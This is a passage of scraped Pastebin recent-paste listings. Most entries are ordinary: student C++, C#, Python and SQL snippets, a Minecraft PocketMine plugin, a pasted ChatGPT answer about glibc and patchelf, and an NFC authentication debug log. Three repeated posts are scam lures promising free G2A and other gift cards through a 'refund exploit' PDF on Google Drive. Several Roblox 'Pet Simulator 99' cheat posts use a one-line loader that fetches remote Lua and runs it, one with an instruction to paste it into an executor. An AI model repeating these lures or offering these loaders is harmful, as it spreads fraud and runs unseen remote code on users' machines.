	md5_finish_ctx(&ctx, result);
	md5_hex(result, hash);
}

/**************************************************************************/

"
mtkE5zDu,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🤑,jusst2k4,GetText,Thursday 16th of May 2024 06:19:04 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_598769.pdf

Working as of:
16 May 2024"
AB1qyegw,data-2,TestGuy1,JSON,Thursday 16th of May 2024 06:07:23 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'dfac735e718d5a57c0d82c7726c1928e645cd74fe139f13afdc9992ff0942840d792dd3276df4f5864e06fbe759ca3de88f286ac73f0d842442fbce9d30ba278c587e17ad7534ee679dac95d7f334736a07c726bc2de1c37f883f544cc686e11148b40095754c4e95620d1c854cf67e11fe82d734ecba214b62b7fa5ecfae644',
  otherdata: [
    '6f0a63de444ea443bda7ff826d6ee231',
    'cbf310361dbc57744febe4ce0a6e92f9',
    '44d3db58ed65fd26b030e403a8c0577c',
    '41a6c3cfb60209dd1038b1c0f63fe6bf',
    'b95757fbcad84392ab8ef2b5b35ef712',
    '21266e174d717b617d22ecb512e2fcf2',
    '6313d8f8442f9d770c509cfc5adc3399',
    '79cfd4e35e6c81ce3380798d92177cce'
  ]
}"
H0Pp3sNE,Pet Simulator 99 Script (Link),Bacon_Script,Lua,Thursday 16th of May 2024 05:43:49 AM CDT,"loadstring(game:HttpGet(""https://pastebin.com/raw/NsA1KyhC""))()"
NsA1KyhC,Pet Simulator 99 Script OP😈🔥,Bacon_Script,Lua,Thursday 16th of May 2024 05:42:09 AM CDT,loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/main/840fc22725f3f29d7e07ed24.lua'))()
1sxdcDt4,Pastebin.ai - #1 Free Pastebin alternative,xxsa,PHP,Thursday 16th of May 2024 05:13:22 AM CDT,"https://pastebin.ai - #1 Pastebin Alternative - its free and always will be.

pastebin.ai  is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

Simple Ads by Google Adsense Few rather than Pastebin
150+ different syntax languages - All Free
Paste Folders
Load files feature
Password protected pastes.
Encrypted pastes.
URL Shortener.
Unlisted pastes.
Private pastes.
Embed, download, print pastes.
Socialite (Facebook/Twitter/Google Social login)
Trending pastes page (day, week, month, year)
Encrypted pastes.x
Trending pastes page (day, week, month, year).
No Captcha for logged in users feature.
..................
..............................
"
as1veSBc,Untitled,35657,C++,Thursday 16th of May 2024 05:12:01 AM CDT,"#include <iostream>
#include <set>

using namespace std;

class worker {

public:

    worker(string name, int salary, int id) : name_(name), salary_(salary), id_(id) {}

    void set_name(const string& name) {
        name_ = name;
    }

    string get_name() {
        return name_;
    }

    void set_salary(int salary) {
        salary_ = salary;
    }

    int get_salary() {
        return salary_;
    }

    void set_id(int id) {
        id_ = id;
    }

    int get_id() {
        return id_;
    }

    virtual void work() = 0;

private:
    string name_;
    int salary_;
    int id_;
};

class programmer : public worker {

public:
    programmer(string name, int salary, int id) : worker(name, salary, id) {}

    void add_project(string project_name) {
        projects_.insert(project_name);
    }

    void del_project(string project_name) {
        projects_.erase(project_name);
    }

    int get_project_number() {
        return projects_.size();
    }

    void work() override {
        cout << ""Я пишу код"" << endl;
    }

private:
    set<string> projects_;
};

class manager : public worker {

public:
    manager(string name, int salary, int id, string department_name, int employees_number) : worker(name, salary, id), department_name_(department_name), employees_number_(employees_number) {}

    int get_employees_number() {
        return employees_number_;
    }

    void set_department_name(string name) {
        department_name_ = name;
    }

    string get_department_name() {
        return department_name_;
    }

    void work() override {
        cout << ""Я руковожу"" << endl;
    }

private:
    string department_name_;
    int employees_number_;
};

int main() {
    setlocale(LC_ALL, ""ru"");

    programmer pr(""Иван"", 1000, 12356733);
    
    manager mn(""Оля"", 2000, 12356741, ""Отдел разработки"", 10);

    pr.add_project(""Калькулятор"");

    cout << pr.get_project_number() << endl;

    cout << mn.get_department_name() << endl;

    mn.work();

    pr.work();
}
"
7nWY0vvr,Entity,LA_,PHP,Thursday 16th of May 2024 04:48:52 AM CDT,"<?php
declare(strict_types=1);

namespace plugin\entity\type;

use pocketmine\entity\Entity;
use pocketmine\entity\EntitySizeInfo;
use pocketmine\nbt\tag\CompoundTag;
use pocketmine\entity\Location;
use pocketmine\player\Player;
use pocketmine\math\Vector3;
use pocketmine\event\entity\EntityDamageEvent;

// use pocketmine\entity\Human;


// https://github.com/CustomiesDevs/Customies/wiki/Custom-Entities
class DinosaurEntity extends Entity {

    public function __construct(Location $location) {
        $this->setNameTag(""Dino"");
        $this->setNameTagAlwaysVisible(true);

        parent::__construct($location);
    }

    // public function __construct(Location $location, ?CompoundTag $nbt = null) {
    //     parent::__construct($location, $nbt);
    //     $this->setNameTagVisible();
    //     $this->setNameTagAlwaysVisible();
    //     $this->setNameTag(""zzzz"");
    // }

    protected function getInitialSizeInfo() : EntitySizeInfo {
        return new EntitySizeInfo(2.0, 2.0, 2.0);
    }

    protected function getInitialDragMultiplier() : float {
        return 0;
    }

    protected function getInitialGravity() : float {
        return 0;
    }

    public static function getNetworkTypeId() : string {
        return ""alleva:dinosaur"";
    }

    // public function onInteract(Player $player, Vector3 $clickPos) : bool{
    //     $player->sendMessage(""Hello, my friend!"");
    //     return true;
    // }

    // public function onInteract(Player $player, Vector3 $clickPos) : bool {
    //     $player->sendMessage(""Hello, my friend!"");
    // }

    // public function attack(EntityDamageEvent $source): void {
    //     parent::attack($source);
    //     if ($source instanceof EntityDamageByEntityEvent) {
    //         $player = $source->getDamager();
    //         $player->sendMessage(""Hello"");
    //     }
    // }

    public function entityBaseTick(int $tickDiff = 1) : bool {
        return parent::entityBaseTick($tickDiff);
    }


    public function onUpdate(int $currentTick) : bool {
        // $this->server->getLogger()->info(""onUpdate DinosaurEntity"");
        if ($this->closed){
            return false;
        }
        $tickDiff = $currentTick - $this->lastUpdate;
        // $this->server->getLogger()->info((string)$tickDiff);
        // if($this->attackTime > 0) {
            $this->move($this->motion->x * $tickDiff, $this->motion->y, $this->motion->z * $tickDiff);
            $this->motion->y -= 0.2 * $tickDiff;
            $this->updateMovement();
        // }
        // return true;
        return parent::onUpdate($currentTick);
    }
}"
WKLky0cS,Listener,LA_,PHP,Thursday 16th of May 2024 04:47:50 AM CDT,"<?php
namespace plugin;

use pocketmine\event\entity\EntityDamageByEntityEvent;
use pocketmine\event\entity\EntitySpawnEvent;
use pocketmine\event\entity\EntityDamageEvent;
use pocketmine\event\player\PlayerInteractEvent;
use pocketmine\event\Listener;
use pocketmine\network\mcpe\protocol\AnimateEntityPacket;
use pocketmine\Server;
use plugin\entity\type\DinosaurEntity;
use pocketmine\utils\TextFormat;
use pocketmine\network\mcpe\NetworkBroadcastUtils;
use pocketmine\console\ConsoleCommandSender;

class EventListener implements Listener {
    public Main $plugin;

    public function __construct(Main $plugin) {
        $this->plugin = $plugin;
    }


    public function doAnimation
      (
        string $animation,
        $entity,
        string $nextState = """",
        string $stopExpression = """",
        int    $stopExpressionVersion = 0,
        string $controller = """",
        float  $blendOutTime = 0
      ): void
      {
        foreach ($entity->getViewers() as $player) {
        //foreach ($entity->getWorld()->getViewersForPosition($entity->getPosition()) as $player) {
          // if($entity instanceof DinosaurEntity) {

              if (isset($player)) {
                if ($player->isConnected()) {
                  $player->getNetworkSession()->sendDataPacket(AnimateEntityPacket::create(
                    $animation, $nextState, $stopExpression, $stopExpressionVersion, $controller, $blendOutTime, [$entity->getId()]
                  ));
                }
              }
          // }
        }
      }


    // https://apidoc.pmmp.io/df/d6f/classpocketmine_1_1event_1_1entity_1_1_entity_spawn_event.html
    public function onEntitySpawn(EntitySpawnEvent $event): void {
        $entity = $event->getEntity();
        if($entity instanceof DinosaurEntity) {
            $this->plugin->getLogger()->info(TextFormat::DARK_GREEN . ""onEntitySpawn DinosaurEntity"");

            // https://apidoc.pmmp.io/dc/da7/classpocketmine_1_1network_1_1mcpe_1_1protocol_1_1_animate_entity_packet.html
            // $animation = AnimateEntityPacket::create(""animation.dinosaur.move"","""","""",0,"""",0,[$entity->getId()]);
            // NetworkBroadcastUtils::broadcastPackets($entity->getWorld()->getPlayers(), [$animation]);

            $this->doAnimation(""animation.dinosaur.move"", $entity);
        }
    }


    // public function onInteract(PlayerInteractEvent $event): void{
    //     // $entity = $event->getEntity();
    //     $player = $event->getPlayer();
    //     $this->plugin->getLogger()->info(TextFormat::DARK_GREEN . ""onInteract"");
    //     $player->sendMessage(""test"");
    // }

    public function onEntityDamageByEntityEvent(EntityDamageByEntityEvent $event){
        $attacker = $event->getDamager();
        $victim = $event->getEntity();
        if($victim instanceof DinosaurEntity) {
            // $this->plugin->getLogger()->info(TextFormat::DARK_GREEN . ""onEntityDamageByEntityEvent DinosaurEntity"");
            $attacker->sendMessage(""Hello"");
        }
    }



}"
wHN90QSH,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🎁,ssss50w,GetText,Thursday 16th of May 2024 04:39:18 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
 
Working as of:
16 May 2024"
qvAyrX9M,Pet Simulator 99 VERY OP SCRIPT😈🔥,Bacon_Script,Lua,Thursday 16th of May 2024 04:37:58 AM CDT,"loadstring(game:HttpGet('https://pastebin.com/raw/DXBHHcQW'))()


Copy and paste this to your executor🔥😈"
1izsMdfP,邀您一起看：24.4416932,xiaomianao666,JavaScript,Thursday 16th of May 2024 04:19:42 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥24.4416932@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxhc3RfY2hhcHRlcl9ydWxlXCI6XCJcIixcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbe1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIuino+aekFwiLFwicGF0aFwiOlwibGF6eVwiLFwicnVsZVwiOlwidmFyIGxhenkgPSAkKCcnKS5sYXp5UnVsZSgoKSA9PiB7XFxuICAgICAgICB2YXIgaHRtbCA9IHBkZmgocmVxdWVzdChpbnB1dCwge30pLCAnI21hZ25ldE9wZW4mJmEmJmhyZWYnKTtcXG4gICAgICAgIGlmIChodG1sKSB7XFxuICAgICAgICAgICAgcmV0dXJuIGh0bWw7XFxuICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgIHJldHVybiAndG9hc3Q6Ly/mtJfmtJfnnaHlkKcnO1xcbiAgICAgICAgfSAgXFxufSk7XCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCLmkJzntKJcIixcInBhdGhcIjpcInNvXCIsXCJydWxlXCI6XCJqczpcXG52YXIgZCA9IFtdO1xcbnZhciBodG1sID0gZ2V0UmVzQ29kZSgpO1xcbi8qXFxuaWYgKE1ZX1BBR0UgPT0gMSkge1xcbmQucHVzaCh7XFxuICAgIGltZzogJ2h0dHBzOi8vd3d3LmhsYXBpLmNuL2FwaS9tbTEnICsgJyMnICsgbmV3IERhdGUoKS5nZXRUaW1lKCksXFxuICAgIHVybDogTVlfVVJMLFxcbiAgICBkZXNjOicwJyxcXG4gICAgY29sX3R5cGU6IFxcXCJjYXJkX3BpY18xXFxcIlxcbn0pXFxufTsqL1xcblxcbmV2YWwoSlNPTi5wYXJzZShmZXRjaCgnaGlrZXI6Ly9wYWdlL2xhenknLCB7fSkpLnJ1bGUpO1xcblxcbnZhciBsaXN0ID0gcGRmYShodG1sLCAnYm9keSYmLmRhdGEtbGlzdCYmLnJvdywxOicpO1xcbmZvciAodmFyIGogaW4gbGlzdCkge1xcbiAgICBkLnB1c2goe1xcbiAgICAgICAgLy90aXRsZTogcGRmaChsaXN0W2pdLCAnYSYmdGl0bGUnKSxcXG4gICAgICAgIHRpdGxlOiAn4oCY4oCY4oCZ4oCZPGI+PHNtYWxsPjxmb250IGNvbG9yPVxcXCIjNDY4MkI0XFxcIj4gJyArIHBkZmgobGlzdFtqXSwgJ2EmJnRpdGxlJykgKyAnPC9mb250Pjwvc21hbGw+JyxcXG4gICAgICAgIGRlc2M6IHBkZmgobGlzdFtqXSwgJy5zaXplLWRhdGUmJlRleHQnKSxcXG4gICAgICAgIC8vaW1nOiBwZChsaXN0W2pdLCAnaW1nJiZzcmMnKSsnQFJlZmVyZXI9JyxcXG4gICAgICAgIC8vY29udGVudDpwZGZoKGxpc3Rbal0sICdwOm1hdGNoZXMoSUTvvJopJiZUZXh0JyksXFxuICAgICAgICB1cmw6IHBkKGxpc3Rbal0sICdhJiZocmVmJykgKyBsYXp5LFxcbiAgICAgICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzFcXFwiXFxuICAgIH0pO1xcbn1cXG5cXG5zZXRSZXN1bHQoZClcIn1dLFwic2F2ZWRcIjpmYWxzZSxcInRpdGxlXCI6XCJCVFNPV1wiLFwidmVyc2lvblwiOjAsXCJ1cmxcIjpcImh0dHBzOi8vYnRzb3cubW90b3JjeWNsZXMvc2VhcmNoLzQ0MTY5MzI7Z2V0O1VURi04O3tVc2VyLUFnZW50QE1vemlsbGEvNS4wIChMaW51eO+8m++8myBBbmRyb2lkIDEx77yb77ybIE1pIDEwIFBybykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzg4LjAuNDMyNC4xNTIgTW9iaWxlIFNhZmFyaS81MzcuMzZ9XCIsXCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwiZmluZF9ydWxlXCI6XCJqczooXFxuKCkgPT4ge1xcbiAgICBldmFsKEpTT04ucGFyc2UoZmV0Y2goXFxcImhpa2VyOi8vcGFnZS9zb1xcXCIsIHt9KSkucnVsZSk7XFxufVxcbikoKVwiLFwiZ3JvdXBcIjpcIuKRo+KPsFwiLFwidWFcIjpcIm1vYmlsZVwiLFwicHJlUnVsZVwiOlwiLy8gICAgaHR0cHM6Ly9idHNvdy5jb20vXCIsXCJwYWdlc1wiOlwiW3tcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcIuino+aekFxcXCIsXFxcInBhdGhcXFwiOlxcXCJsYXp5XFxcIixcXFwicnVsZVxcXCI6XFxcInZhciBsYXp5ID0gJCgnJykubGF6eVJ1bGUoKCkgPT4ge1xcXFxuICAgICAgICB2YXIgaHRtbCA9IHBkZmgocmVxdWVzdChpbnB1dCwge30pLCAnI21hZ25ldE9wZW4mJmEmJmhyZWYnKTtcXFxcbiAgICAgICAgaWYgKGh0bWwpIHtcXFxcbiAgICAgICAgICAgIHJldHVybiBodG1sO1xcXFxuICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgcmV0dXJuICd0b2FzdDovL+a0l+a0l+edoeWQpyc7XFxcXG4gICAgICAgIH0gIFxcXFxufSk7XFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwi5pCc57SiXFxcIixcXFwicGF0aFxcXCI6XFxcInNvXFxcIixcXFwicnVsZVxcXCI6XFxcImpzOlxcXFxudmFyIGQgPSBbXTtcXFxcbnZhciBodG1sID0gZ2V0UmVzQ29kZSgpO1xcXFxuLypcXFxcbmlmIChNWV9QQUdFID09IDEpIHtcXFxcbmQucHVzaCh7XFxcXG4gICAgaW1nOiAnaHR0cHM6Ly93d3cuaGxhcGkuY24vYXBpL21tMScgKyAnIycgKyBuZXcgRGF0ZSgpLmdldFRpbWUoKSxcXFxcbiAgICB1cmw6IE1ZX1VSTCxcXFxcbiAgICBkZXNjOicwJyxcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJjYXJkX3BpY18xXFxcXFxcXCJcXFxcbn0pXFxcXG59OyovXFxcXG5cXFxcbmV2YWwoSlNPTi5wYXJzZShmZXRjaCgnaGlrZXI6Ly9wYWdlL2xhenknLCB7fSkpLnJ1bGUpO1xcXFxuXFxcXG52YXIgbGlzdCA9IHBkZmEoaHRtbCwgJ2JvZHkmJi5kYXRhLWxpc3QmJi5yb3csMTonKTtcXFxcbmZvciAodmFyIGogaW4gbGlzdCkge1xcXFxuICAgIGQucHVzaCh7XFxcXG4gICAgICAgIC8vdGl0bGU6IHBkZmgobGlzdFtqXSwgJ2EmJnRpdGxlJyksXFxcXG4gICAgICAgIHRpdGxlOiAn4oCY4oCY4oCZ4oCZPGI+PHNtYWxsPjxmb250IGNvbG9yPVxcXFxcXFwiIzQ2ODJCNFxcXFxcXFwiPiAnICsgcGRmaChsaXN0W2pdLCAnYSYmdGl0bGUnKSArICc8L2ZvbnQ+PC9zbWFsbD4nLFxcXFxuICAgICAgICBkZXNjOiBwZGZoKGxpc3Rbal0sICcuc2l6ZS1kYXRlJiZUZXh0JyksXFxcXG4gICAgICAgIC8vaW1nOiBwZChsaXN0W2pdLCAnaW1nJiZzcmMnKSsnQFJlZmVyZXI9JyxcXFxcbiAgICAgICAgLy9jb250ZW50OnBkZmgobGlzdFtqXSwgJ3A6bWF0Y2hlcyhJRO+8mikmJlRleHQnKSxcXFxcbiAgICAgICAgdXJsOiBwZChsaXN0W2pdLCAnYSYmaHJlZicpICsgbGF6eSxcXFxcbiAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwidGV4dF8xXFxcXFxcXCJcXFxcbiAgICB9KTtcXFxcbn1cXFxcblxcXFxuc2V0UmVzdWx0KGQpXFxcIn1dXCJ9IiwidGl0bGUiOiIyNC40NDE2OTMyIn0=
vCbrSw8w,Практика (день 4),Lavig,Python,Thursday 16th of May 2024 04:15:34 AM CDT,"def skip():
    print (""_"" * 60)
    print (""_"" * 60)
skip()
# Варіант 2
# Завдання 1
while True:
    try:
        number = float((input(""\033[1m\033[33mВведіть будь-яке натуральне п'ятизначне число: \033[0m"")))
    except:
        print(""\033[1m\033[31mВводити можна тільки числа. Спробуйте ще раз!\033[0m"")
        continue
    if number < 0:
        print(""\033[1m\033[31mВводити можна тільки натуральні числа. Спробуйте ще раз!\033[0m"")
        continue
    if number.is_integer() == True:
        number = int(number)
    else:
        print(""\033[1m\033[31mВводити можна тільки натуральні числа. Спробуйте ще раз!\033[0m"")
        continue
    number = str(number)
    length = len(number)
    if length != 5:
        print(""\033[1m\033[31mВводити можна тільки п'ятизначні числа. Спробуйте ще раз!\033[0m"")
        continue
    break
number = int(number)
print(""\033[1m\033[95mПерша цифра числа –\033[97m"", number // 10000, ""\033[0m"")
print(""\033[92;1mДруга цифра числа –\033[97m"", number % 10000 // 1000, ""\033[0m"")
print(""\033[1m\033[96mТретя цифра числа –\033[97m"", number % 1000 // 100, ""\033[0m"")
print(""\033[1m\033[33mЧетверта цифра числа –\033[97m"", number % 100 // 10, ""\033[0m"")
print(""\033[1m\033[95mП'ята цифра числа –\033[97m"", number % 10 // 1, ""\033[0m"")
skip()
# Завдання 2
sentence = input(""\033[92;1mВведіть будь-яке речення: \033[0m"")
print(""\033[1m\033[96mКількість симолів у реченні –\033[97m"", len(sentence), ""\033[0m"")
skip()"
dVZ2aXj7,Download -compile different glibc,plirof2,Bash,Thursday 16th of May 2024 04:06:09 AM CDT,"I have debian bulleye. Can you write me a bash script that will download and compile different glibc versions and put them on different folders? I want to be able to runn programs made for different versions using patchelf --set-interpreter . I don't want to change anything on my system. I just want to have different versions of glibc in different folders. Please, selecte the most important versions that will cover most of old and new programs.

---------
Sure! Here's a bash script that will download and compile glibc versions 2.13, 2.17, 2.23, 2.27, 2.31, and 2.33, and place them in different folders:
```bash
#!/bin/bash

# Create directories for each glibc version
mkdir glibc-2.13 glibc-2.17 glibc-2.23 glibc-2.27 glibc-2.31 glibc-2.33

# Download and extract glibc versions
wget https://ftp.gnu.org/gnu/glibc/glibc-2.13.tar.gz
tar -xzvf glibc-2.13.tar.gz -C glibc-2.13 --strip-components=1

wget https://ftp.gnu.org/gnu/glibc/glibc-2.17.tar.gz
tar -xzvf glibc-2.17.tar.gz -C glibc-2.17 --strip-components=1

wget https://ftp.gnu.org/gnu/glibc/glibc-2.23.tar.gz
tar -xzvf glibc-2.23.tar.gz -C glibc-2.23 --strip-components=1

wget https://ftp.gnu.org/gnu/glibc/glibc-2.27.tar.gz
tar -xzvf glibc-2.27.tar.gz -C glibc-2.27 --strip-components=1

wget https://ftp.gnu.org/gnu/glibc/glibc-2.31.tar.gz
tar -xzvf glibc-2.31.tar.gz -C glibc-2.31 --strip-components=1

wget https://ftp.gnu.org/gnu/glibc/glibc-2.33.tar.gz
tar -xzvf glibc-2.33.tar.gz -C glibc-2.33 --strip-components=1

# Compile each glibc version
for dir in glibc-2.13 glibc-2.17 glibc-2.23 glibc-2.27 glibc-2.31 glibc-2.33; do
    (
        cd $dir
        mkdir build
        cd build
        ../configure --prefix=$PWD/install
        make -j$(nproc)
        make install
    )
done

```bash
This script will download the specified glibc versions, extract them, compile them, and install them in separate directories. You can then use patchelf to set the interpreter path when running programs with different glibc versions.

Remember to give execute permission to the script using chmod +x script.sh and run it using ./script.sh from the terminal



"
nwALES2C,邀您一起看：尖叫,xiaomianao666,JavaScript,Thursday 16th of May 2024 04:05:45 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥尖叫@@
qnNsb4cV,ДЗ: Скобочное выражение,TeT91,C#,Thursday 16th of May 2024 04:02:33 AM CDT,"using System;

namespace CSLight
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string brakets = ""()"";
            char openedBraket = '(';
            char closedBraket = ')';

            int maxDeep = 0;
            int currentDeep = 0;

            int half = 2;

            if (brakets.Length % half == 0)
            {
                for (int i = 0; i < brakets.Length; i++)
                {
                    if (brakets[i] == openedBraket)
                    {
                        currentDeep++;
                        if (currentDeep > maxDeep)
                        {
                            maxDeep = currentDeep;
                        }
                    }
                    else if (brakets[i] == closedBraket)
                    {
                        currentDeep--;

                        if(currentDeep < 0)
                        {
                            break;
                        }
                    }
                }

                if (currentDeep != 0)
                {
                    Console.WriteLine(""Строка не корректна"");
                }
                else
                {
                    Console.WriteLine($""Строка корректна. Глубина {maxDeep}"");
                }
            }
            else
            {
                Console.WriteLine(""Строка не корректна"");
            }

            Console.ReadKey();
        }
    }
}"
eCgSEZcr,Untitled,luthfy13,MySQL,Thursday 16th of May 2024 03:58:37 AM CDT,"SELECT
	vwPindahHbInternal.*,
	trx_surat_pindah_hb_internal.*,
	mst_perihal_surat.perihal_surat 
FROM
	trx_surat_pindah_hb_internal
	INNER JOIN trx_surat ON trx_surat_pindah_hb_internal.no_surat = trx_surat.no_surat
	INNER JOIN mst_perihal_surat ON trx_surat.id_perihal = mst_perihal_surat.id_perihal
	INNER JOIN vwPindahHbInternal ON vwPindahHbInternal.id_permintaan = trx_surat_pindah_hb_internal.id_permintaan 
WHERE
	vwPindahHbInternal.sts_permintaan = '6' 
	AND vwPindahHbInternal.id_profil = '222033' 
	AND getIdUnitSurat ( trx_surat.no_surat ) = id_fakultas"
0N9r2x8v,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🤑,jusst2k4,GetText,Thursday 16th of May 2024 03:52:56 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_452033.pdf

Working as of:
16 May 2024"
bacrERrX,run linux program made for lower GLIBC than mine,plirof2,JavaScript,Thursday 16th of May 2024 03:44:02 AM CDT,"
==========================
linux how can I have multiple versions of GLIBC in my system? Without docker and without compiling . So I can use them with patchelf interpreter parameter? 

One way to have multiple versions of GLIBC on your system without using Docker or compiling is to use a chroot environment. A chroot environment allows you to run a separate instance of the Linux operating system within your existing system. 

Here's a general outline of how you can set up a chroot environment with multiple versions of GLIBC:

1. Download and install the necessary version of GLIBC in a separate directory within your system (e.g. /opt/glibc-2.x).
2. Create a chroot environment using the chroot command, specifying the directory where you installed GLIBC as the root directory.
3. Within the chroot environment, you can use the patchelf command with the interpreter parameter to execute programs compiled against the specific version of GLIBC that you installed.

Keep in mind that setting up and maintaining a chroot environment can be complex and may require some trial and error. Additionally, using a chroot environment may not be suitable for all use cases, so make sure to carefully consider whether this approach is appropriate for your specific needs.

==============================================

Εσείς
In linux how can I run a program written for higher GLIBC than mine? Without making changes on my system? and without docker


ChatGPT
Αντιγραφή
One way to run a program that requires a higher version of GLIBC than the one installed on your system is by using a tool called ""patchelf."" Patchelf is a small utility that can modify the dynamic linker and RPATH of an executable, allowing it to use a different version of the GLIBC library.

Here's how you can use patchelf to run a program with a higher version of GLIBC:

Download and install patchelf on your system. You can usually find it in your distribution's package repository or download it from the official website.

Find the executable file of the program that requires a higher version of GLIBC.

Use the following command to modify the RPATH of the executable to point to a directory where the higher version of GLIBC is installed:

 
patchelf --set-interpreter /path/to/higher_version_glibc/ld-linux-x86-64.so.2 --set-rpath /path/to/higher_version_glibc/lib:/path/to/higher_version_glibc/lib64 your_program_executable
Replace ""/path/to/higher_version_glibc"" with the actual path to the directory where the higher version of GLIBC is installed, and ""your_program_executable"" with the name of the program executable file.

Now run the modified program using the following command:
 
./your_program_executable
This should allow the program to run using the higher version of GLIBC without making changes to your system or using Docker. Keep in mind that this method may not work for all programs, as some may have additional dependencies that need to be resolved.


=============================================
Εσείς
In linux how can I run a program written for lower GLIBC than mine? Without making changes on my system?


ChatGPT
Αντιγραφή
One way to run a program written for a lower GLIBC version than the one on your system is to use a tool called patchelf. This tool allows you to modify the dynamic linker and interpreter path in the ELF binary, allowing it to run on a system with a different GLIBC version.

Here's how you can use patchelf to run a program with a lower GLIBC version:

First, install patchelf if you don't already have it on your system. You can install it using your package manager (e.g., sudo apt-get install patchelf on Debian-based systems).
Use the following command to change the interpreter path in the ELF binary:
 
patchelf --set-interpreter /path/to/older/glibc/ld-linux.so.2 /path/to/your/program
Replace /path/to/older/glibc/ld-linux.so.2 with the path to the older version of the ld-linux.so.2 file on your system, and replace /path/to/your/program with the path to the program you want to run.

Run the program using the modified ELF binary:
 
./path/to/your/program
This method will allow you to run a program with a lower GLIBC version on your system without making any changes to your system-wide libraries."
6AUbvejj,Output,Amrin12,Bash,Thursday 16th of May 2024 03:43:51 AM CDT,"'EV2 First RandB Enc: ', 'FD99A2DA41CEED1422CBB278FFC3D6CB'
'Auth EV2 First RandB: ', 'afd6fe94d98f6825b13b6b18266979d8'
'Auth EV2 First RandB Rotate: ', 'd6fe94d98f6825b13b6b18266979d8af'
'Auth EV2 First RandA: ', '12cbc827037361ca719fc00108e0f134'
input bytes: AFA489D8BEE3FF2A4097F8C60A1C84A6BAD6286A2A7356E2EAAE9352058F74579E
Operation Success
'First part response: ', { status: 0,
  data: '3BE204D70DCE33584FFCD9F9502622C3778B52B0DFF8C8647C553F3238051BF9' }
'Data received: ', '80db5387cbc827037361ca719fc00108e0f13412000000000000c00000000000'
'TI: ', '80db5387'
'RandA: ', 'cbc827037361ca719fc00108e0f13412'
'PCDcap: ', '000000000000c00000000000'
Auth successful!
'RandA Bytes: ', { '0': 18,
  '1': 203,
  '2': 200,
  '3': 39,
  '4': 3,
  '5': 115,
  '6': 97,
  '7': 202,
  '8': 113,
  '9': 159,
  '10': 192,
  '11': 1,
  '12': 8,
  '13': 224,
  '14': 241,
  '15': 52 }
'RandB Bytes: ', { '0': 175,
  '1': 214,
  '2': 254,
  '3': 148,
  '4': 217,
  '5': 143,
  '6': 104,
  '7': 37,
  '8': 177,
  '9': 59,
  '10': 107,
  '11': 24,
  '12': 38,
  '13': 105,
  '14': 121,
  '15': 216 }
'RandA_15_14:', { '0': 18, '1': 203 }
'RandA_13_8:', { '0': 200, '1': 39, '2': 3, '3': 115, '4': 97, '5': 202 }
'RandB_15_10:', { '0': 175, '1': 214, '2': 254, '3': 148, '4': 217, '5': 143 }
'RandB_9_0:', { '0': 104,
  '1': 37,
  '2': 177,
  '3': 59,
  '4': 107,
  '5': 24,
  '6': 38,
  '7': 105,
  '8': 121,
  '9': 216 }
'RandA_7_0:', { '0': 113,
  '1': 159,
  '2': 192,
  '3': 1,
  '4': 8,
  '5': 224,
  '6': 241,
  '7': 52 }
'XORed Value: ', '67f1fde7b845'
'XORed Bytes: ', [ 103, 241, 253, 231, 184, 69 ]
'SV1: ', [ 165,
  90,
  0,
  1,
  0,
  128,
  18,
  203,
  103,
  241,
  253,
  231,
  184,
  69,
  104,
  37,
  177,
  59,
  107,
  24,
  38,
  105,
  121,
  216,
  113,
  159,
  192,
  1,
  8,
  224,
  241,
  52 ]
'SV2: ', [ 90,
  165,
  0,
  1,
  0,
  128,
  18,
  203,
  103,
  241,
  253,
  231,
  184,
  69,
  104,
  37,
  177,
  59,
  107,
  24,
